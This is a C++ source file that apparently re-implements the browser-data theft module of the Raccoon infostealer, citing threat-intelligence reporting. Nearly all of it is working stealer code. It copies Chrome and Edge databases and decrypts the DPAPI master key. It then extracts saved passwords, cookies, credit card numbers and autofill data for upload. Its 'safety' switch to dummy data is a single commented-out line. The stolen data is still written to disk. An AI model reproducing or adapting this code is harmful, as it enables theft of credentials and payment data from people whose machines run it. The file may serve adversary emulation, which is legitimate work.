#pragma once
#include "browser.h"

RacSqlite3ColumnBlob g_racSqlite3ColumnBlob;
RacSqlite3Open g_racSqlite3Open;
RacSqlite3PrepareV2 g_racSqlite3PrepareV2;
RacSqliteFinalize g_racSqliteFinalize;
RacSqlite3Close g_racSqlite3Close;
RacSqlite3Step g_racSqlite3Step;
RacSqlite3ColumnBytes g_racSqlite3ColumnBytes;
RacSqlite3ColumnText g_racSqlite3ColumnText;
RacSqlite3ErrMsg g_racSqlite3ErrMsg;

/*
* Raccoon uses sqlite3.dll dropped to disk to steal browser data from chromium based browsers.
* This functionality isn't detailed much in threat intelligence, so implementation is home grown.
* 
* // Ref: https://jhoneill.github.io/powershell/2020/11/23/Chrome-Passwords.htm
* 
* Sources:
* - Functionality inferred from Sekoia
* 
*/
int browserTheft() {
    vector<char> exfilData;
    int res;

    res = extractChromiumData(exfilData);

    // NOT IMPLEMENTED -- FIREFOX THEFT

    return res;
}

/*
* Dumps chromium browser data to memory for direct exfiltration.
* 
* SAFTEY NOTE -- This uses dummy data to actually send over the
* network due to the raw HTTP connection. All theft still occurs
* and is written to disk locally. Swap out the last line if you
* want to send the real stuff.
* 
* STATUS CODES:
* (chrome/edge)
* -1 = setup failed
* -2/6 = login data failed
* -3/7 = cookies failed
* -4/8 = webdata failed
* -5/9 = autofill failed
* 
* Sources:
* - Functionality inferred from Sekoia
*/
int extractChromiumData(vector<char>& exfilData) {

    struct stat st;
    LPWSTR localTemp;
    HRESULT status;
    int res;
    DATA_BLOB keyBlob;

    // Get the local appdata location and install directories
    status = g_racSHGetKnownFolderPath(FOLDERID_LocalAppData, 0, 0, &localTemp);
    if (status != S_OK) return -1;

    wstring local = wstring(localTemp);
    wstring chromeDir = local + g_google_chrome_user_data;
    wstring edgeDir = local + g_microsoft_edge_user_data;

    // Load the sqlite DLL
    wstring dllPath = (g_localLowPath + g_stagingFolder + g_sqlitedll);
    HMODULE hSqlite3 = loadDLLFromDisk(dllPath);

    //Resolve the functions used for query queries
    res = resolveSqliteFunctions(hSqlite3);
    if (res != 0) return -1;


    bool extractedOneBrowser = false;
    // Extract Data
    // -------- Chrome
    if (stat(string(chromeDir.begin(), chromeDir.end()).c_str(), &st) == 0) {

        // Create DB copies
        res = createChromiumDBCopies(chromeDir);
        if (res == 0) {
            // Get the DPAPI key data to decrypt information from both browsers
            keyBlob = getDPAPIKeyBlob(chromeDir);

            appendWStringToVector(exfilData, g_chrome);
            res = getChromiumLoginData(exfilData, keyBlob);
            if (res != 0) return -2;

            res = getChromiumCookies(exfilData, keyBlob);
            if (res != 0) return -3;

            res = getChromiumCreditCardData(exfilData, keyBlob);
            if (res != 0) return -4;

            res = getChromiumAutofillData(exfilData, keyBlob);
            if (res != 0) return -5;
        
            extractedOneBrowser = true;
        }


    }

    // -------- Edge
    if (stat(string(edgeDir.begin(), edgeDir.end()).c_str(), &st) == 0) {

        // Create DB copies
        res = createChromiumDBCopies(edgeDir);
        if (res == 0) {
            // Get the DPAPI key data to decrypt information from both browsers
            keyBlob = getDPAPIKeyBlob(edgeDir);

            appendWStringToVector(exfilData, g_edge);
            res = getChromiumLoginData(exfilData, keyBlob);
            if (res != 0) return -6;

            res = getChromiumCookies(exfilData, keyBlob);
            if (res != 0) return -7;

            res = getChromiumCreditCardData(exfilData, keyBlob);
            if (res != 0) return -8;

            res = getChromiumAutofillData(exfilData, keyBlob);
            if (res != 0) return -9;

            extractedOneBrowser = true;
        }
    }

    // cleanup
    unloadDLL(hSqlite3);
    g_racLocalFree(keyBlob.pbData);

    if (extractedOneBrowser) {
        // exfil the FAKE data
        return sendMultipartUpload(vector<char>(g_browserTheft.begin(), g_browserTheft.end()), g_browser_theft, g_token);
        // exfil the REAL data
        //return sendMultipartUpload(vector<char>(exfilData.begin(), exfilData.end()), g_browser_theft, g_token);
    }
    else {
        return -1;
    }
    
}

/*
* Given an AES key and a chromium aes-gcm encrypted blob (prepended with `V10`),
* decrypt the blob.
* ref: https://jhoneill.github.io/powershell/2020/11/23/Chrome-Passwords.html
* ref: https://0x00sec.org/t/malware-development-1-password-stealers-chromeDir/33571
*
* Sources:
* - Functionality inferred from Sekoia
*
*/
vector<unsigned char> decryptChromiumBrowserBlob(vector<char> blob, DATA_BLOB keyBlob) {
    //wrangle bytes
    vector<unsigned char> iv(blob.begin() + 3, blob.begin() + 15);
    vector<unsigned char> enc(blob.begin() + 15, blob.end() - 16);
    vector<unsigned char> tag(blob.end() - 16, blob.end());

    BCRYPT_ALG_HANDLE hAlgorithm = 0;
    BCRYPT_KEY_HANDLE hKey = 0;
    NTSTATUS status = 0;
    vector<unsigned char> dec(enc.size());

    // Open algorithm provider for decryption
    status = g_racBCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        //wprintf(L"Error 0x%x returned by BCryptGetProperty\n", status);
        return dec;
    }

    // Set chaining mode for decryption
    status = g_racBCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
        (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    if (!BCRYPT_SUCCESS(status))
    {
        //wprintf(L"Error 0x%x returned by BCryptGetProperty\n", status);
        g_racBCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return dec;
    }

    ULONG PlainTextSize = 0;

    // Generate symmetric key
    status = g_racBCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, keyBlob.pbData, keyBlob.cbData, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        //wprintf(L"Error 0x%x returned by BCryptGetProperty\n", status);
        g_racBCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return dec;
    }

    // Auth cipher mode info
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
    //TagOffset = TagOffset - 16;
    AuthInfo.pbNonce = iv.data();
    AuthInfo.cbNonce = iv.size();
    AuthInfo.pbTag = tag.data();
    AuthInfo.cbTag = tag.size();

    DWORD cbDecrypted = 0;

    // Decrypt the data
    status = g_racBCryptDecrypt(
        hKey,
        enc.data(),
        enc.size(),
        &AuthInfo,
        nullptr,
        0,
        dec.data(),
        dec.size(),
        &cbDecrypted,
        NULL
    );

    //ntstatus = 0xc000000d : An invalid parameter was passed to a service or function.

    /*if (status) {
        wprintf(L"Error 0x%x returned by BCryptDecrypt(2)\n", status);
        cout << "Returned dec size: " << cbDecrypted << "\n";
    }*/

    // Close the algorithm handle
    g_racBCryptCloseAlgorithmProvider(hAlgorithm, 0);

    //cout << "decrpyted plaintext: " << string(dec.begin(), dec.end());
    return dec;
}

/**
* Per threat intelligence, Raccoon creates copies of the databases
* before accessing them to exfiltrate the information
* 
* Sources:
* - Sekoia
*/
int createChromiumDBCopies(wstring installDir) {
    // Copy sqlite databases to working dir
    wstring path;
    struct stat st;
    vector<char> fileBytes;

    path = installDir + g_defaultWebData;

    if (stat(string(path.begin(), path.end()).c_str(), &st) == 0) {
        fileBytes = readBytesFromFile(installDir + g_defaultWebData);
        writeBytesToFile(fileBytes, (g_localLowPath + g_stagingFolder + g_webdata));
    }
    else {
        return -1;
    }
    
    path = installDir + g_defaultLoginData;
    if (stat(string(path.begin(), path.end()).c_str(), &st) == 0) {
        fileBytes = readBytesFromFile(path);
        writeBytesToFile(fileBytes, (g_localLowPath + g_stagingFolder + g_LoginData));
    }
    else {
        return -1;
    }

    path = installDir + g_defaultNetworkCookies;
    if (stat(string(path.begin(), path.end()).c_str(), &st) == 0) {
        fileBytes = readBytesFromFile(path);
        writeBytesToFile(fileBytes, (g_localLowPath + g_stagingFolder + g_cookies));
    }
    else {
        return -1;
    }

    return 0;
}

/**
* Gets stored login data from the browser
*/
int getChromiumLoginData(vector<char>& exfilData, DATA_BLOB keyBlob) {
    sqlite3* db;
    sqlite3_stmt* pStmt;
    wstring wstmp = (g_localLowPath + g_stagingFolder + g_LoginData);

    // Open the DB connection
    if (g_racSqlite3Open(string(wstmp.begin(), wstmp.end()).c_str(), &db)) { // 0 is success
        //cout << "Failed to open CLoginData w/ sqlite. \n";
        return -1;
    }

    // Craft the query
    string query = string(g_select_from_logins.begin(), g_select_from_logins.end());
    int res = g_racSqlite3PrepareV2(db, query.c_str(), -1, &pStmt, 0);
    if (res) { // 0 is success
        //cout << "Failed to prepare statement: " << g_racSqlite3ErrMsg(db) << "\n";
        return -1;
    }

    // Add string header to file
    appendWStringToVector(exfilData, g_looted_logins);

    // Iterate over the data
    while (g_racSqlite3Step(pStmt) == SQLITE_ROW) {
        string url = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 0));
        string username = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 1));
        int sPwdBlob = g_racSqlite3ColumnBytes(pStmt, 2);
        const void* pwdBlob = g_racSqlite3ColumnBlob(pStmt, 2);
        vector<char> cryptedBytes(sPwdBlob);
        memcpy(cryptedBytes.data(), pwdBlob, sPwdBlob);
        vector<unsigned char> decryptedBytes = decryptChromiumBrowserBlob(cryptedBytes, keyBlob);
        appendWStringToVector(exfilData, (g_append_url
            + wstring(url.begin(), url.end())
            + g_append_username + wstring(username.begin(), username.end())
            + g_append_password + wstring(decryptedBytes.begin(), decryptedBytes.end())
            + g_newLineChar));
    }

    // Close out the db
    g_racSqliteFinalize(pStmt);
    g_racSqlite3Close(db);

    return 0;
}

/**
* Gets the stored cookies
*/
int getChromiumCookies(vector<char>& exfilData, DATA_BLOB keyBlob) {
    sqlite3* db;
    sqlite3_stmt* pStmt;
    wstring wstmp = (g_localLowPath + g_stagingFolder + g_cookies);

    if (g_racSqlite3Open(string(wstmp.begin(), wstmp.end()).c_str(), &db)) { // 0 is success
        //cout << "Failed to open CLoginData w/ sqlite. \n";
        return -1;
    }

    string query = string(g_select_from_cookies.begin(), g_select_from_cookies.end());

    int res = g_racSqlite3PrepareV2(db, query.c_str(), -1, &pStmt, 0);
    if (res) { // 0 is success
        //cout << "Failed to prepare statement: " << g_racSqlite3ErrMsg(db) << "\n";
        return -1;
    }

    // Add the section header
    appendWStringToVector(exfilData, g_looted_cookies);

    while (g_racSqlite3Step(pStmt) == SQLITE_ROW) {
        string hostKey = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 0));
        string name = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 1));
        int sCookieBlob = g_racSqlite3ColumnBytes(pStmt, 2);
        const void* cookieBlob = g_racSqlite3ColumnBlob(pStmt, 2);
        vector<char> cryptedBytes(sCookieBlob);
        memcpy(cryptedBytes.data(), cookieBlob, sCookieBlob);
        vector<unsigned char> decryptedBytes = decryptChromiumBrowserBlob(cryptedBytes, keyBlob);
        appendWStringToVector(exfilData, (g_append_hostkey
            + wstring(hostKey.begin(), hostKey.end())
            + g_append_name + wstring(name.begin(), name.end())
            + g_append_value
            + wstring(decryptedBytes.begin(), decryptedBytes.end())
            + g_newLineChar));
    }

    // Close out the db
    g_racSqliteFinalize(pStmt);
    g_racSqlite3Close(db);

    return 0;
}

/**
* Grabs the credit card information from the chromium database.
*/
int getChromiumCreditCardData(vector<char>& exfilData, DATA_BLOB keyBlob) {
    // Read CC data from Web Data DB
    sqlite3* db;
    sqlite3_stmt* pStmt;
    wstring wstmp = (g_localLowPath + g_stagingFolder + g_webdata);

    if (g_racSqlite3Open(string(wstmp.begin(), wstmp.end()).c_str(), &db)) { // 0 is success
        //cout << "Failed to open CWebData w/ sqlite. \n";
        return -1;
    }

    string query = string(g_select_from_credit_cards.begin(), g_select_from_credit_cards.end());
    int res = g_racSqlite3PrepareV2(db, query.c_str(), -1, &pStmt, 0);
    if (res) { // 0 is success
        //cout << "Failed to prepare statement: " << g_racSqlite3ErrMsg(db) << "\n";
        return -1;
    }

    // Add the section header
    appendWStringToVector(exfilData, g_looted_ccs);

    while (g_racSqlite3Step(pStmt) == SQLITE_ROW) {
        string name = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 0));
        string expMonth = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 1));
        string expYear = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 2));
        int sCcNumBlob = g_racSqlite3ColumnBytes(pStmt, 3);
        const void* ccNumBlob = g_racSqlite3ColumnBlob(pStmt, 3);
        vector<char> cryptedBytes(sCcNumBlob);
        memcpy(cryptedBytes.data(), ccNumBlob, sCcNumBlob);
        vector<unsigned char> decryptedBytes = decryptChromiumBrowserBlob(cryptedBytes, keyBlob);
        appendWStringToVector(exfilData, (g_append_name_2
            + wstring(name.begin(), name.end())
            + g_append_expiration
            + wstring(expMonth.begin(), expMonth.end())
            + g_forwardSlash
            + wstring(expYear.begin(), expYear.end())
            + g_append_cc
            + wstring(decryptedBytes.begin(), decryptedBytes.end())
            + g_newLineChar));
    }

    // Close out the db
    g_racSqliteFinalize(pStmt);
    g_racSqlite3Close(db);

    return 0;
}

/**
* Grabs the autofill information from the chromium database.
*/
int getChromiumAutofillData(vector<char>& exfilData, DATA_BLOB keyBlob) {
    // Read CC data from Web Data DB
    sqlite3* db;
    sqlite3_stmt* pStmt;
    wstring wstmp = (g_localLowPath + g_stagingFolder + g_webdata);

    // Read autofill data from web data db
    if (g_racSqlite3Open(string(wstmp.begin(), wstmp.end()).c_str(), &db)) { // 0 is success
        //cout << "Failed to open CWebData w/ sqlite. \n";
        return -1;
    }

    string query = string(g_select_from_autofill.begin(), g_select_from_autofill.end());
    int res = g_racSqlite3PrepareV2(db, query.c_str(), -1, &pStmt, 0);
    if (res) { // 0 is success
        //cout << "Failed to prepare statement: " << g_racSqlite3ErrMsg(db) << "\n";
        return -1;
    }

    // Add the section header
    appendWStringToVector(exfilData, g_looted_autofill);

    while (g_racSqlite3Step(pStmt) == SQLITE_ROW) {
        string name = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 0));
        string value = reinterpret_cast<const char*>(g_racSqlite3ColumnText(pStmt, 1));
        appendWStringToVector(exfilData,
            (g_append_name_2 + wstring(name.begin(), name.end())
                + g_append_value
                + wstring(value.begin(), value.end())
                + g_newLineChar));
    }
    
    // Close out the db
    g_racSqliteFinalize(pStmt);
    g_racSqlite3Close(db);

    return 0;
}

/**
* Gets the DPAPI key which can be used to extract the Chrome or Edge
* keys independently
*/
DATA_BLOB getDPAPIKeyBlob(wstring installDir) {
    // read encoded + protected master key from Local State
    ifstream file;
    file.open(installDir + g_localState, ios::in);
    size_t pos;
    size_t endPos;
    string line;
    string searchTarget = string(g_encrypted_key.begin(), g_encrypted_key.end());

    getline(file, line);
    pos = line.find(searchTarget);
    pos += 16; // length of `encrypted_key":"`
    endPos = line.find('"', pos);
    string encodedKey = line.substr(pos, endPos - pos);
    file.close();

    // decode the protected aes-gcm masterkey
    string tmp = decodeB64(encodedKey);
    string cryptedKey = decodeB64(encodedKey).substr(5); // strip the prepended `DPAPI`

    //decrypt the aes-gcm key w/ dpapi unprotect
    DATA_BLOB cryptedKeyBlob;
    DATA_BLOB keyBlob; // must call LocalFree on the pbData member when done with it.

    cryptedKeyBlob.pbData = reinterpret_cast<BYTE*>(&cryptedKey[0]);
    cryptedKeyBlob.cbData = static_cast<DWORD>(cryptedKey.size());
    if (!g_racCryptUnprotectData(&cryptedKeyBlob, nullptr, nullptr, nullptr, nullptr, 0, &keyBlob)) {
        //cout << "Unprotect failed!\n";
    }

    return keyBlob;
}

/**
* Resolves function pointers to the newly-loaded sqlite DLL similar to
* the previously established Windows APIs
*/
int resolveSqliteFunctions(HMODULE& hSqlite3) {
    g_racSqlite3ColumnBlob =
        (RacSqlite3ColumnBlob)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_column_blob.begin(), g_sqlite3_column_blob.end()).c_str());
    if (!g_racSqlite3ColumnBlob) return -1;

    g_racSqlite3Open =
        (RacSqlite3Open)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_open.begin(), g_sqlite3_open.end()).c_str());
    if (!g_racSqlite3Open) return -1;

    g_racSqlite3PrepareV2 =
        (RacSqlite3PrepareV2)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_prepare_v2.begin(), g_sqlite3_prepare_v2.end()).c_str());
    if (!g_racSqlite3PrepareV2) return -1;

    g_racSqliteFinalize =
        (RacSqliteFinalize)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_finalize.begin(), g_sqlite3_finalize.end()).c_str());
    if (!g_racSqliteFinalize) return -1;

    g_racSqlite3Close =
        (RacSqlite3Close)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_close.begin(), g_sqlite3_close.end()).c_str());
    if (!g_racSqlite3Close) return -1;

    g_racSqlite3Step =
        (RacSqlite3Step)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_step.begin(), g_sqlite3_step.end()).c_str());
    if (!g_racSqlite3Step) return -1;

    g_racSqlite3ColumnBytes =
        (RacSqlite3ColumnBytes)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_column_bytes.begin(), g_sqlite3_column_bytes.end()).c_str());
    if (!g_racSqlite3ColumnBytes) return -1;

    g_racSqlite3ColumnText =
        (RacSqlite3ColumnText)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_column_text.begin(), g_sqlite3_column_text.end()).c_str());
    if (!g_racSqlite3ColumnText) return -1;

    g_racSqlite3ErrMsg =
        (RacSqlite3ErrMsg)g_racGetProcAddress(hSqlite3,
            string(g_sqlite3_errmsg.begin(), g_sqlite3_errmsg.end()).c_str());
    if (!g_racSqlite3ErrMsg) return -1;

    return 0;
}